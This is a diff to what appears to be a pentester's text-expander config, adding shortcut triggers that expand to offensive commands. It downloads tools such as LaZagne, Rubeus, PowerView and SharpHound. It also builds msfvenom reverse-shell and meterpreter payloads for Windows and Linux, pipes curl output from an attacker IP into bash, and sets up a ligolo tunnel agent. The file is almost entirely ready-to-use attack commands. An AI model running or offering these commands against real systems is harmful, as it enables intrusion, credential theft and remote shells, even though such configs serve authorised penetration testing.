@@ -29,12 +29,28 @@ matches:
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230219/winPEASany.exe -O wp.exe & 
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
+      wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
+      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
+      wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
       wget -q https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox_CHATTR -O chattr &
+      wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
       msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf &
       msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
       msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
       sudo python3 -m http.server 80
+
+  - trigger: ":msfwin"
+    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=
+
+  - trigger: ":msfmwin"
+    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=
+
+  - trigger: ":msflin"
+    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
+
+  - trigger: ":msfmlin"
+    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
 
   - trigger: ":rev"
     replace: curl http://{{IP}}/shell.sh | bash
@@ -70,8 +86,6 @@ matches:
     replace: certutil.exe -urlcache -split -f http://{{IP}}/
   
   - trigger: ":pligolo"
-    replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert
-  
+    replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert 
   - trigger: ":aligolo"
-    replace: .\agent.exe -connect {{IP}}:11601 -ignore-cert
-    
+    replace: ./agent.exe -connect {{IP}}:11601 -ignore-cert
